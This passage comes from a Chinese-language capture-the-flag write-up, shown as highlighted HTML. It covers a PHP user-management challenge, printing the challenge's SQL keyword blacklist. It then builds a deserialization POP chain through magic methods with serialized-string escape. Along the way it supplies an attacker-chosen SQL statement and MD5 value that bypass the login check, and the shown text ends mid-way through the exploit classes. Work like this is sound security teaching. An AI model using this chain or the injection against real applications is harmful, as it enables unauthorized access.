300</span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">&gt;</span></span>百万前端的用户信息管理系统<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h3</span><span class=\"token punctuation\">&gt;</span></span>半成品系统 留后门的程序员已经跑路<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h3</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        \t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>username<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">placeholder</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UserName<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">required</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">margin-top</span><span class=\"token punctuation\">:</span> 20</span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">placeholder</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">required</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">margin-top</span><span class=\"token punctuation\">:</span>20<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>登录<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>img/1.jpg<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">&gt;</span></span>大家记得做好防护<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>img</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$user</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;br&gt;Damn you, hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Damn you, hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token variable\">$user</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr></tbody></table></figure><p>update.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'lib.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;html&gt;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;meta charset=\"utf-8\"&gt;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>&lt;title&gt;update&lt;/title&gt;</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>&lt;/html&gt;'<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"你还没有登陆呢！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$users</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$users</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">===</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>大致浏览一下源码，很明显可以知道唯一获得 flag 的方式在 <code>update.php</code>  中的 <code>echo $flag;</code> ，要想进入语句，就要使 <code>$_SESSION['login']===1</code>  成立，而这一语句成立的位置为 <code>User</code>  类的 <code>login</code>  方法，对  <code>$_SESSION['login']</code>  进行赋值，但在进行该语句前，又会进入 <code>dbCtrl</code>  类的 <code>login</code>  方法中，查看此处 <code>login</code>  的逻辑</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">mysqli</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">hostname</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">dbuser</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">dbpass</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">database</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"连接失败，错误:\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">bind_param</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'s'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">bind_result</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$idResult</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$passwordResult</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$idResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$idResult</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'用户不存在!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token variable\">$passwordResult</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'密码错误！'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$idResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>由于一开始未成功登陆，第一个 if 必然不通过，因此若想要返回 id 值从而对 <code>$_SESSION['login']</code>  赋值，那么要通过第三个判断（第二个判断只要 sql 语句执行成功就可），也就是要使得输入的 <code>password</code>  与 sql 查出来的 <code>password</code>  相同，由于预设的 sql 语句为 <code>select id,password from user where username=?</code> , 不妨将 id、password 分别改为 1 和 1 对应的 md5 值，从而查出来的 <code>password</code>  的 md5 值可控。满足该判断条件，之后将执行 <code>$_SESSION['token']=$this-&gt;name;</code>  可使得在下一次进入该函数时直接通过第一个判断。至此，得到两种方法，第一种调用 <code>User</code>  类的 <code>login</code>  方法，其中对 <code>dbCtrl</code>  类的 <code>login</code>  进行控制；第二种调用 <code>dbCtrl</code>  的 <code>login</code>  方法。但由于在调用 <code>User</code>  类的 <code>login</code>  方法时无法对 <code>dbCtrl</code>  直接进行操作，故这里采用第二种方法。</p>\n<p>要想进行如上操作， <code>User</code>  类的 <code>login</code>  方法执行路口，也即要找到反序列化入口。观察源码，可知 <code>User</code>  类中的 <code>update</code>  方法中有语句 <code>$Info=unserialize($this-&gt;getNewinfo());</code> , 再结合 <code>update.php</code>  中的</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$users</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$users</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>可知， <code>User</code>  类中的 <code>update</code>  方法可以执行，再看其反序列化对象 <code>$this-&gt;getNewinfo()</code> ，由 <code>safe(serialize(new Info($age,$nickname)))</code>  得到而 age，nickname 分别由 post 上传得到，可控，反序列化入口找到。而恰好 <code>update.php</code>  会执行 <code>User</code>  的 <code>update</code>  方法</p>\n<p>现在首先先不看 <code>safe</code>  方法，我们需要通过 <code>Info</code>  类来执行 <code>User</code>  类中的 <code>login</code>  方法，观察 <code>Info</code>  类，可看到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$argument</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">CtrlCase</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$argument</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>恰好执行了 login 方法，那么我们所需要做的是反序列化时使得 CtrlCase 对应的一个对象从而调用 User 类的 login 方法或直接为 User 类，而要调用此__call 魔术方法，需要使用 Info 类调用不存在的方法，也就是说我们需要找到一个位置调用 Info 类的一个方法，再回到源码，可以发现 User 类中和 UpdateHelper 类中分别有方法</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//User</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"0-0\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//UpdateHelper</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>这样我们可以通过 <code>UpdateHelper</code>  类的 <code>__destruct</code>  方法来调用 <code>User</code>  类的 <code>__toString</code>  方法，如果此时 <code>nickname</code>  值为 <code>Info</code>  类对象，这里调用了 <code>Info</code>  类中的 <code>update</code>  方法，但由于 <code>Info</code>  类中没有此方法，便调用了 <code>__call</code>  方法，实现了之前的目的。</p>\n<p>至此，对于方法的调用结束，这时需要想办法进行序列化操作，通过反序列化得到一个满足条件的 <code>Info</code>  类</p>\n<p><code>Info</code>  类中， <code>CtrlCase</code>  为一个 <code>UpdateHelper</code>  对象，摧毁时，自自动执行 <code>echo $this-&gt;sql;</code> , 而 <code>sql</code>  对应一个一个 <code>User</code>  对象，自动调用 <code>nickname</code>  的 <code>update</code>  方法，此时 <code>nickname</code>  为一个 <code>Info</code>  对象，无  <code>update</code>  方法，调用 <code>__call</code>  方法，之后执行 <code>echo $this-&gt;CtrlCase-&gt;login($argument[0]);</code> , 而此时 <code>CtrlCase</code>  为一个 <code>dbCtrl</code>  对象，调用其 <code>login</code>  方法， <code>sql</code>  语句为前一个 <code>User</code>  的 <code>age</code> ，即 <code>age</code>  赋值为 <code>SELECT 1,\\\"c4ca4238a0b923820dcc509a6f75849b\\\"from user where username=?</code> , 所以进行该语句，通过所有函数， <code>$_SESSION['token']=$this-&gt;name</code>  执行，下一次再进入时，可直接登陆成功</p>\n<p>这里看 <code>Info</code>  类的 <code>__construct</code>  方法，只对 <code>age</code>  和 <code>nickname</code>  进行赋值，根据上面的分析，必须要有 <code>CtrlCase</code>  变量的赋值，所以这里采用手动添加，值为一个 <code>UpdateHelper</code>  的序列化字符串，即为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>s<span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>\\<span class=\"token string double-quoted-string\">\"CtrlCase\\\";\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$updateHelper</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>要想成功反序列化，即让添加的 <code>CtrlCase</code>  成功反序列化，我们需要反序列化逃逸，所幸在进行反序列化操作前，用 <code>safe</code>  函数对字符串进行了过滤，会将符合条件的字符串修改为 <code>hacker</code> ，为字符串逃逸提供条件，这里为了减少序列化字符串量，使用 <code>into</code>  转换，一次多两个字符</p>\n<p>这里先给出序列化类</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT 1,\\\"c4ca4238a0b923820dcc509a6f75849b\\\"from user where username=?\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//sql 查询语句，用来绕过第三个判断</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Info</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$CtrlCase</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">UpdateHelper</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token 